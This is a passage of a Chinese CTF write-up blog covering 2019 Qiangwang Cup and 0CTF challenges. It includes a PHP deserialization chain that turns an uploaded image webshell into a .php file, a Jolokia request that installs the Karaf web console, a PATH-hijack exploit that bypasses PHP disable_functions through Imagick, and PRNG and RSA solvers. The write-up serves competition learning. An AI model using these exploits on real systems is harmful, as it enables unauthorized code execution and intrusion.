class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> mt19937predictor <span class="keyword">import</span> MT19937Predictor</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">dict=[chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">token=<span class="string">'35561ebb6d2cd5f8f6dddd1c1f60b613'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Pow</span><span class="params">(part_hex,hash_value)</span>:</span></span><br><span class="line">pre=part_hex.decode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> itertools.product(dict,repeat=<span class="number">3</span>):</span><br><span class="line"> i=pre+<span class="string">''</span>.join(s)</span><br><span class="line"> <span class="keyword">if</span> sha256(i).hexdigest()==hash_value:</span><br><span class="line"> <span class="keyword">print</span> <span class="string">"success"</span></span><br><span class="line"> <span class="keyword">return</span> i.encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">"119.3.245.36"</span>,<span class="number">23456</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.recvuntil(<span class="string">".hexdigest()="</span>)</span><br><span class="line">hash_value=r.recv(<span class="number">64</span>)</span><br><span class="line">r.recvuntil(<span class="string">".encode('hex')="</span>)</span><br><span class="line">part_hex=r.recv(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">print</span> hash_value,part_hex</span><br><span class="line">result=Pow(part_hex,hash_value)</span><br><span class="line">r.sendline(result)</span><br><span class="line">r.sendlineafter(<span class="string">'teamtoken:'</span>,token)</span><br><span class="line">r.recvuntil(<span class="string">'Generating challenge 1'</span>)</span><br><span class="line">base=int(time.time())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge1</span><span class="params">(base)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">random.seed(base)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>):</span><br><span class="line">data=random.randint(<span class="number">0</span>,<span class="number">2</span>**<span class="number">64</span>)</span><br><span class="line">r.recvuntil(<span class="string">"[-]"</span>,timeout=<span class="number">1</span>)</span><br><span class="line">r.sendline(str(data))</span><br><span class="line"><span class="keyword">if</span> <span class="string">"completed"</span> <span class="keyword">in</span> r.recv():</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">base=base<span class="number">-1</span></span><br><span class="line">challenge1(base)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge2</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">r.recvuntil(<span class="string">"[-]"</span>)</span><br><span class="line">v1=r.recvuntil(<span class="string">"\n"</span>).strip()</span><br><span class="line">r.recvuntil(<span class="string">"[-]"</span>)</span><br><span class="line">v2=r.recvuntil(<span class="string">"\n"</span>).strip()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">o = subprocess.check_output([<span class="string">"/usr/lib/jvm/jdk-12.0.1/bin/java"</span>, <span class="string">"ReplicatedRandom"</span>,v1,v2])</span><br><span class="line">result=o.strip()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">result=<span class="string">"123"</span></span><br><span class="line">r.sendline(result)</span><br><span class="line">data=r.recv()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"123"</span>+data</span><br><span class="line"><span class="keyword">if</span> <span class="string">"completed"</span> <span class="keyword">in</span> r.recv():</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">challenge2()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge3</span><span class="params">()</span>:</span></span><br><span class="line">predictor = MT19937Predictor()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">r.sendline(<span class="string">"123"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"[+]failed:"</span>)</span><br><span class="line">data=r.recvuntil(<span class="string">"[-]"</span>)</span><br><span class="line">predictor.setrandbits(int(data[:<span class="number">-4</span>]), <span class="number">32</span>)</span><br><span class="line">result=predictor.getrandbits(<span class="number">32</span>)</span><br><span class="line">r.sendline(str(result))</span><br><span class="line">r.recvuntil(<span class="string">"flag"</span>)</span><br><span class="line">challenge3()</span><br></pre></td></tr></table></figure><h3 id="强网先锋——辅助"><a href="#强网先锋——辅助" class="headerlink" title="强网先锋——辅助"></a>强网先锋——辅助</h3><p>送分题，两个n算最大公因数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1=<span class="number">14967030059975114950295399874185047053736587880127990542035765201425779342430662517765063258784685868107066789475747180244711352646469776732938544641583842313791872986357504462184924075227433498631423289187988351475666785190854210389587594975456064984611990461126684301086241532915267311675164190213474245311019623654865937851653532870965423474555348239858021551589650169602439423841160698793338115204238140085738680883313433574060243600028500600824624358473403059597593891412179399165813622512901263380299561019624741488779367019389775786547292065352885007224239581776975892385364446446185642939137287519945974807727</span></span><br><span class="line">n2=<span class="number">14624662628725820618622370803948630854094687814338334827462870357582795291844925274690253604919535785934208081825425541536057550227048399837243392490762167733083030368221240764693694321150104306044125934201699430146970466657410999261630825931178731857267599750324918610790098952520113593130245010530961350592735239454337631927669542026935873535964487595433984902529960726655481696404006628917922241666148082741874033756970724357470539589848548704573091633917869387239324447730587545472564561496724882799495186768858324490838169123077051890332313671220385830444331578674338014080959653201802476516237464651809255679979</span></span><br><span class="line"></span><br><span class="line">p=gcd(n1,n2)</span><br><span class="line">q=n1/p</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">2482083893746618248544426737023750400124543452082436334398504986023501710639402060949106693279462896968839029712099336235976221571564642900240827774719199533124053953157919850838214021934907480633441577316263853011232518392904983028052155862154264401108124968404098823946691811798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432684946922741232053249894575417796067090655122702306134848220257943297645461477488086804856018323986796999103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597</span></span><br><span class="line">d=invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line"><span class="keyword">print</span> long_to_bytes(pow(c,d,n1))</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p><a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a> 源码泄露。上传一个图片马，因为后缀名是png不能解析，利用cookie反序列化，把图片马写到php后缀的文件里：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-f501656e75aeb6ad.png" alt="image.png"></p><p>这里filename可控，调用upload_img方法就可以了。</p><p>把源码拖下来放到本地web根目录，修改index.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $profile;</span><br><span class="line">    <span class="keyword">public</span> $profile_db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;login_check())&#123;</span><br><span class="line">            $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/home"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">"index"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">home</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;login_check())&#123;</span><br><span class="line">            $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_upload_img())&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">"username"</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'username'</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">"upload"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">"img"</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'img'</span>]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">"username"</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'username'</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">"home"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $profile=cookie(<span class="string">'user'</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</span><br><span class="line">            <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;profile) &amp;&amp; !<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;profile_db))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'img'</span>]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">logout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cookie(<span class="string">"user"</span>,<span class="keyword">null</span>);</span><br><span class="line">        $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> Profile();</span><br><span class="line">$test-&gt;checker = <span class="number">0</span>;</span><br><span class="line">$test-&gt;except = <span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line">$test-&gt;ext = <span class="string">'php'</span>;</span><br><span class="line">$test-&gt;filename_tmp = <span class="string">'./upload/08856017fa6b6b422db719c5519123dc/8266e4bfeda1bd42d8f9794eb4ea0a13.png'</span>;</span><br><span class="line">$test-&gt;filename = <span class="string">'./upload/08856017fa6b6b422db719c5519123dc/gml.php'</span>;</span><br><span class="line"></span><br><span class="line">$a=  <span class="keyword">new</span> Register();</span><br><span class="line">$a-&gt;checker = $test;</span><br><span class="line">$a-&gt;registed =<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">$exp = base64_encode(serialize($a));</span><br><span class="line">var_dump($exp);</span><br></pre></td></tr></table></figure><p>访问：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-d1fafcb9bd46afc5.png" alt="image.png"></p><p>cookie传过去，发现写入成功：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a95ea999ec835bc5.png" alt="image.png"></p><p>getflag：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-dd607dade5421776.png" alt="image.png"></p><h3 id="强网先锋——上单"><a href="#强网先锋——上单" class="headerlink" title="强网先锋——上单"></a>强网先锋——上单</h3><p>在log里发现payload：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-fb215a37964b3de4.png" alt="image.png"></p><p>打一下：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-1e6ebac53b27142c.png" alt="image.png"></p><p>getflag:</p><p><img src="C:%5CUsers%5C43575%5CAppData%5CLocal%5CTemp%5C1558881058312.png" alt="1558881058312"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 0CTF</title>
      <link href="/2019/03/28/2019-0CTF/"/>
      <url>/2019/03/28/2019-0CTF/</url>
      
        <content type="html"><![CDATA[<p>果然 0CTF 是为神仙准备的，自闭了。</p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Ghost-Pepper"><a href="#Ghost-Pepper" class="headerlink" title="Ghost Pepper"></a>Ghost Pepper</h4><a id="more"></a><p>Java Web 没怎么接触过，利用这次学习一下。</p><p>参考：</p><ol><li><a href="http://momomoxiaoxi.com/2019/03/26/tctf2019/#ghost-pepper" target="_blank" rel="noopener">http://momomoxiaoxi.com/2019/03/26/tctf2019/#ghost-pepper</a></li><li><a href="https://blog.csdn.net/like98k/article/details/88797218" target="_blank" rel="noopener">https://blog.csdn.net/like98k/article/details/88797218</a></li></ol><p>进去发现要登录，用 chrome 看不出，拿 firefox可以看到提示：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a8de5797085db37e.png" alt="image.png"></p><p>karaf/karaf 登录进去，发现什么也没有，看到是 Jetty，发现有 Jolokia，搜漏洞。 </p><p>比较简单的一种做法是 karaf 有一个 webconsole，我们可以安装一个进控制台拿 flag。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jolokia/exec</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 111.186.63.207:31337</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Authorization</span>: Basic a2FyYWY6a2FyYWY=</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain</span><br><span class="line"><span class="attribute">Content-Length</span>: 150</span><br><span class="line"></span><br><span class="line">&#123;  "mbean": "org.apache.karaf:name=root,type=feature",  "operation": "installFeature(java.lang.String)",  "type": "EXEC",  "arguments":["webconsole"]&#125;</span><br></pre></td></tr></table></figure><p>访问 <code>http://111.186.63.207:31337/system/console/gogo</code></p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-805d6c483fdf6cf2.png" alt="image.png"></p><p>另一种是通过osgi.core 的 installBundleFromURL 来安装bundle，这部分可以参考@moxiaoxi的wp。</p><h4 id="Wallbreaker-Easy"><a href="#Wallbreaker-Easy" class="headerlink" title="Wallbreaker Easy"></a>Wallbreaker Easy</h4><p>赛后看各位大师傅们的 wp，基本都是通过启用新的进程来调用 so，so文件我们可控并通过修改<code>LD_PRELOAD</code>  方式加载来执行命令。这里贴上几个链接。</p><ol><li><a href="https://xz.aliyun.com/t/4589" target="_blank" rel="noopener">https://xz.aliyun.com/t/4589</a></li><li><a href="http://momomoxiaoxi.com/2019/03/26/tctf2019/" target="_blank" rel="noopener">http://momomoxiaoxi.com/2019/03/26/tctf2019/</a></li><li><a href="https://paper.tuisec.win/detail/d4ba64dd4d1dc38" target="_blank" rel="noopener">https://paper.tuisec.win/detail/d4ba64dd4d1dc38</a></li></ol><p>以及柠檬师傅的<code>bypass disable_functions</code>的 <a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">总结</a>。</p><p>此外还看到了一种突破 <code>open_basedir</code>，从而读别人目录下 flag 的操作：<a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy" target="_blank" rel="noopener">https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy</a></p><p>还有一种解法相比劫持函数简单一些。在调用 Imagick 将 png、bmp等格式的文件转成 jxr 类型时，会调用系统PATH 路径下的 <code>JxrEncApp</code>来进行转换。<a href="https://stackoverflow.com/questions/22235227/imagemagick-convert-png-to-jxr" target="_blank" rel="noopener">参考</a></p><p>所以我们可以利用 <code>putenv</code> 把 PATH 改到自己的 tmp 路径下，把要执行的命令写到该路径下的 <code>JxrEncApp</code>里，这样我们在转换的时候就可以执行系统命令了。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">dir=<span class="string">"/tmp/2204d9af0488be704281eca42608c464"</span></span><br><span class="line">exploit_php = <span class="string">'''</span></span><br><span class="line"><span class="string">&lt;pre&gt;</span></span><br><span class="line"><span class="string">Open Basedir: &lt;br&gt;&lt;?php echo ini_get('open_basedir');?&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">Disable functions: &lt;br&gt;&lt;?php echo ini_get('disable_functions'); ?&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$tmp = "%s";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">file_put_contents("$tmp/1.bmp", file_get_contents("http://www.humanesociety.org/sites/default/files/2018/06/cat-217679.jpg"));</span></span><br><span class="line"><span class="string">$exp = &lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string">/readflag &gt; $tmp/data</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">file_put_contents("$tmp/JxrEncApp", $exp);</span></span><br><span class="line"><span class="string">chmod("$tmp/JxrEncApp", 0777);</span></span><br><span class="line"><span class="string">putenv("PATH=$tmp:/usr/sbin:/usr/bin:/bin");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">try &#123;</span></span><br><span class="line"><span class="string">    $a = new Imagick();</span></span><br><span class="line"><span class="string">    $a-&gt;readImage("$tmp/1.bmp");</span></span><br><span class="line"><span class="string">    $a-&gt;writeImage("$tmp/1.jxr");</span></span><br><span class="line"><span class="string">&#125; catch (Exception $e) &#123;</span></span><br><span class="line"><span class="string">var_dump($e);</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;br&gt;</span></span><br><span class="line"><span class="string">Command output:</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">echo file_get_contents("$tmp/data");</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">'''</span>% dir</span><br><span class="line">gadget_code = <span class="string">'''</span></span><br><span class="line"><span class="string">file_put_contents("%s/gml", base64_decode("%s"));</span></span><br><span class="line"><span class="string">include "%s/gml";</span></span><br><span class="line"><span class="string">unlink("%s/gml");</span></span><br><span class="line"><span class="string">'''</span>% (dir,base64.b64encode(exploit_php),dir,dir)</span><br><span class="line">print(requests.post(<span class="string">"http://111.186.63.208:31340"</span>, data=&#123;<span class="string">'backdoor'</span>: gadget_code &#125;).content)</span><br></pre></td></tr></table></figure><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><p>0CTF的 Crypto 抬手就是论文，真实。</p><h4 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h4><p>pubkey.py 中发现 RSA 的公钥 e=31337，而 N 是个多项式。</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-809ce9413e637f1e.png" alt="image.png"></p><p>rsa.sage:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pubkey <span class="keyword">import</span> P, n, e</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"></span><br><span class="line">R.&lt;a&gt; = GF(<span class="number">2</span>^<span class="number">2049</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> n</span><br><span class="line">    <span class="keyword">assert</span> len(m) &lt;= <span class="number">256</span></span><br><span class="line">    m_int = Integer(m.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">    m_poly = P(R.fetch_int(m_int))</span><br><span class="line">    c_poly = pow(m_poly, e, n)</span><br><span class="line">    c_int = R(c_poly).integer_representation()</span><br><span class="line">    c = format(c_int, <span class="string">'0256x'</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    ptext = flag + os.urandom(<span class="number">256</span>-len(flag))</span><br><span class="line">    ctext = encrypt(ptext)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'flag.enc'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(ctext)</span><br></pre></td></tr></table></figure><p>多项式 RSA 算法，google 了相关论文：<a href="http://www.diva-portal.se/smash/get/diva2:823505/FULLTEXT01.pdf" target="_blank" rel="noopener">http://www.diva-portal.se/smash/get/diva2:823505/FULLTEXT01.pdf</a></p><p>这个题每项都是模2的，所以 p = 2，类似于一般的 RSA 难点是分解大数 N，多项式 RSA 是对多项式 N 进行因式分解（系数模 p ）。</p><p>我选择使用 Mathematica 来分解（简直神器，用这个工具解了好多密码题…）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Factor[多项式,Modulus-&gt;2]</span><br></pre></td></tr></table></figure><p>可以看到 